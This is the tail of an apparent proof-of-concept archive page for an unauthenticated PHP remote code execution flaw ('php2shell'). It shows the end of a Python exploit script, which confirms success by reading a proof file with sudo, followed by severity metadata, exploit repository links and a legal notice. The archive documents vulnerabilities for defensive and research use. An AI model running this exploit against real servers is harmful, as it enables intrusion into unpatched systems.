+</span></span><span class=line><span class=cl>            <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.6</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>exists</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>proof</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>                <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                    <span class=n>proof</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>proof</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>                <span class=k>except</span> <span class=ne>PermissionError</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                    <span class=n>proof</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>run</span><span class=p>([</span><span class=s2>&#34;sudo&#34;</span><span class=p>,</span> <span class=s2>&#34;cat&#34;</span><span class=p>,</span> <span class=n>args</span><span class=o>.</span><span class=n>proof</span><span class=p>],</span>
+</span></span><span class=line><span class=cl>                                           <span class=n>capture_output</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>text</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span><span class=o>.</span><span class=n>stdout</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[4/4] RCE OK; proof </span><span class=si>%s</span><span class=s2>:&#34;</span> <span class=o>%</span> <span class=n>args</span><span class=o>.</span><span class=n>proof</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=n>proof</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;      candidate failed (no proof)&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[4/4] all attempts failed&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=k>raise</span> <span class=ne>SystemExit</span><span class=p>(</span><span class=n>main</span><span class=p>())</span>
+</span></span></code></pre></td></tr></table></div></div></div></div><nav class="grid grid-cols-1 gap-3 pt-2 sm:grid-cols-2"><a href=/pocs/web/2026-11-25_cve-2026-75431-poc/ class="group rounded-lg border border-zinc-200 p-3 transition hover:border-emerald-400 dark:border-mono-border dark:bg-mono-card dark:hover:border-brand"><span class="font-mono text-[10px] uppercase tracking-wide text-zinc-400 dark:text-mono-muted">← previous in web</span>
+<span class="mt-1 block truncate font-mono text-xs text-zinc-700 group-hover:text-emerald-600 dark:text-slate-300 dark:group-hover:text-brand">PowerJob Server Predictable JWT Signing Key → Admin Token Forgery (CVE-2026-75431)</span>
+</a><a href=/pocs/web/2026-11-25_cve-2026-131852-poc/ class="group rounded-lg border border-zinc-200 p-3 text-right transition hover:border-emerald-400 dark:border-mono-border dark:bg-mono-card dark:hover:border-brand"><span class="font-mono text-[10px] uppercase tracking-wide text-zinc-400 dark:text-mono-muted">next in web →</span>
+<span class="mt-1 block truncate font-mono text-xs text-zinc-700 group-hover:text-emerald-600 dark:text-slate-300 dark:group-hover:text-brand">OwnTracks Recorder — Stored Format String in json_response() via Location tid (CVE-2026-131852)</span></a></nav></div><aside class="hidden lg:block"><div class="sticky top-20 space-y-4"><nav class="rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card"><p class="mb-2 border-b border-zinc-200 pb-2 font-mono text-xs font-bold uppercase tracking-wider text-zinc-900 dark:border-mono-border dark:text-white">On this page</p><div class="toc text-sm leading-relaxed"><nav id=TableOfContents><ul><li><a href=#metadata>Metadata</a></li><li><a href=#affected-target>Affected Target</a></li><li><a href=#summary>Summary</a></li><li><a href=#vulnerability-details>Vulnerability Details</a><ul><li><a href=#root-cause>Root Cause</a></li><li><a href=#attack-vector>Attack Vector</a></li><li><a href=#impact>Impact</a></li></ul></li><li><a href=#environment--lab-setup>Environment / Lab Setup</a><ul><li><a href=#setup-steps>Setup Steps</a></li></ul></li><li><a href=#proof-of-concept>Proof of Concept</a><ul><li><a href=#step-by-step-reproduction>Step-by-Step Reproduction</a></li><li><a href=#exploit-code>Exploit Code</a></li><li><a href=#expected-output>Expected Output</a></li></ul></li><li><a href=#detection--indicators-of-compromise>Detection & Indicators of Compromise</a></li><li><a href=#remediation>Remediation</a></li><li><a href=#references>References</a></li><li><a href=#notes>Notes</a></li></ul></nav></div></nav><div class="space-y-5 rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card"><div><div class="flex items-baseline justify-between"><span class="font-mono text-xs uppercase tracking-wide text-zinc-500 dark:text-zinc-400">CVSS</span>
+<span class="font-mono text-lg font-semibold text-red-500 dark:text-red-400">9.8<span class="text-xs text-zinc-400 dark:text-zinc-600">/10</span></span></div><div class="mt-1.5 h-1.5 w-full overflow-hidden rounded-full bg-zinc-200 dark:bg-mono-bg"><div class="h-full rounded-full bg-red-500" style=width:98%></div></div></div><div class="rounded-md border border-red-500/25 bg-red-500/5 p-3"><p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">Exploitation signals</p><div class="mt-2 flex flex-wrap gap-1.5"><span class="inline-flex items-center gap-1 rounded border px-2 py-0.5 font-mono text-[11px] uppercase tracking-wide border-red-300 bg-red-50 text-red-600 dark:border-red-800 dark:bg-red-950 dark:text-red-400" title="Listed in the CISA Known Exploited Vulnerabilities catalog — added 2026-10-26">KEV</span>
+<span class="inline-flex items-center gap-1 rounded border px-2 py-0.5 font-mono text-[11px] uppercase tracking-wide border-zinc-300 bg-zinc-50 text-zinc-600 dark:border-zinc-700 dark:bg-zinc-800 dark:text-zinc-400" title="FIRST EPSS — probability of exploitation in the next 30 days">EPSS 45%</span></div><p class="mt-2 font-mono text-[11px] leading-relaxed text-zinc-600 dark:text-zinc-400">Confirmed exploited in the wild. Added to CISA KEV 2026-10-26. Federal remediation deadline 2026-10-29.</p><p class="mt-1 font-mono text-[11px] text-zinc-500 dark:text-zinc-400">EPSS 45.1% · 99th percentile</p></div><dl class="space-y-3 font-mono text-xs"><div><dt class="text-zinc-500 dark:text-zinc-400">Severity</dt><dd class=mt-1><span class="inline-flex items-center gap-1.5 rounded-md border px-2 py-0.5 font-mono text-xs font-semibold uppercase tracking-wide border-red-300 bg-red-50 text-red-600 dark:border-red-800 dark:bg-red-950 dark:text-red-400"><span class="h-1.5 w-1.5 rounded-full bg-current"></span>Critical</span></dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">CVE</dt><dd class="mt-1 text-emerald-600 dark:text-emerald-400">CVE-2026-109618, CVE-2026-109619</dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Category</dt><dd class=mt-1><a href=/pocs/web/ class="text-zinc-700 hover:text-emerald-600 dark:text-zinc-300 dark:hover:text-emerald-400">web</a></dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Affected product</dt><dd class="mt-1 text-zinc-700 dark:text-zinc-300">PHP (Apache mod_php and PHP-FPM SAPIs)</dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Affected versions</dt><dd class="mt-1 text-zinc-700 dark:text-zinc-300">PHP 7.3.0–8.2.35, 8.3.0–8.3.36, 8.4.0–8.4.27, 8.5.0–8.5.12 (NVD ranges)</dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Disclosed</dt><dd class="mt-1 text-zinc-700 dark:text-zinc-300">2026-11-25</dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Patch status</dt><dd class=mt-1><span class="text-emerald-600 dark:text-brand" title="Fix confirmed via OSV: 00d8bae801541db0d95a698e108bb4b1b273fe6e, 09a9f29a0402bb87bb448cb2e3149ccbec1699c6">Patched</span></dd></div></dl><div><p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">Tags</p><div class="mt-2 flex flex-wrap gap-1.5"><a href=/tags/rce/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#RCE</a>
+<a href=/tags/unauthenticated/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#unauthenticated</a>
+<a href=/tags/php/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#PHP</a>
+<a href=/tags/memory-corruption/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#memory-corruption</a>
+<a href=/tags/longjmp/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#longjmp</a>
+<a href=/tags/oom/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#OOM</a>
+<a href=/tags/stale-state/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#stale-state</a>
+<a href=/tags/apache/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#Apache</a>
+<a href=/tags/mod_php/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#mod_php</a>
+<a href=/tags/php-fpm/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#PHP-FPM</a>
+<a href=/tags/heap-grooming/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#heap-grooming</a>
+<a href=/tags/aslr-bypass/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#ASLR-bypass</a></div></div><div><p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">References</p><ul class="mt-2 space-y-1.5"><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<a href=https://nvd.nist.gov/vuln/detail/CVE-2026-109618 target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://nvd.nist.gov/vuln/detail/CVE-2026-109618</a></li><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<a href=https://nvd.nist.gov/vuln/detail/CVE-2026-109619 target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://nvd.nist.gov/vuln/detail/CVE-2026-109619</a></li><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<a href=https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w</a></li><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<a href=https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp</a></li><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<a href=https://arcticwolf.com/resources/blog/php2shell-critical-php-vulnerabilities-enable-unauthenticated-remote-code-execution/ target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://arcticwolf.com/resources/blog/php2shell-critical-php-vulnerabilities-enable-unauthenticated-remote-code-execution/</a></li><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<a href=https://github.com/rapid7/metasploit-framework/pull/22139 target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://github.com/rapid7/metasploit-framework/pull/22139</a></li><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<a href=https://github.com/9bie/php2shell-bypass-aslr-exp target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://github.com/9bie/php2shell-bypass-aslr-exp</a></li><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<a href=https://github.com/dinosn/php-cve-2026-10961x-lab-poc target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://github.com/dinosn/php-cve-2026-10961x-lab-poc</a></li><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<a href=https://www.cisa.gov/known-exploited-vulnerabilities-catalog target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://www.cisa.gov/known-exploited-vulnerabilities-catalog</a></li></ul></div><div class="border-t border-zinc-200 pt-4 dark:border-mono-border"><p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">Archive entry</p><a href=https://github.com/intelseclab/poc-archive/tree/master/pocs/web/2026-11-25_php2shell-php-core-preauth-rce/ target=_blank rel="noopener noreferrer" class="mt-2 flex items-center gap-2 rounded-md border border-zinc-200 px-3 py-2 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400"><svg class="h-3.5 w-3.5 flex-shrink-0" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37.0.0 5.37.0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57.0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925.0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18.0.0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225.0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22.0 1.605-.015 2.895-.015 3.3.0.315.225.69.825.57A12.02 12.02.0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
+intelseclab/poc-archive</a></div></div><div class="rounded border border-zinc-200 bg-zinc-50 p-3 font-mono text-[11px] text-zinc-500 dark:border-mono-border dark:bg-mono-bg dark:text-mono-muted"><span class="block font-bold text-zinc-900 dark:text-white">[!] Legal notice</span><p class="mt-1 leading-relaxed">Published for defensive and educational use only. Running this against systems you do not own or have written authorisation to test is illegal.</p></div></div></aside></div><script>document.querySelectorAll(".code-copy").forEach(function(e){e.addEventListener("click",function(){var t=e.closest(".poc-code"),n=t&&t.querySelector("code");if(!n)return;navigator.clipboard.writeText(n.innerText).then(function(){var t=e.textContent;e.textContent="Copied",e.classList.add("text-emerald-600","dark:text-brand"),setTimeout(function(){e.textContent=t,e.classList.remove("text-emerald-600","dark:text-brand")},1500)}).catch(function(){e.textContent="Failed",setTimeout(function(){e.textContent="Copy"},1500)})})})</script></main><footer class="mt-16 border-t border-zinc-200 dark:border-mono-border"><div class="mx-auto flex w-full max-w-6xl flex-col gap-2 px-4 py-8 text-xs text-zinc-500 sm:flex-row sm:items-center sm:justify-between sm:px-6 lg:px-8 dark:text-zinc-500"><p class=font-mono>PoC Archive — research artifacts for defensive and educational use only.</p><p class=font-mono>built with <a href=https://gohugo.io class="text-emerald-600 hover:underline dark:text-emerald-400">hugo</a> · deployed on github pages</p></div></footer></body></html>
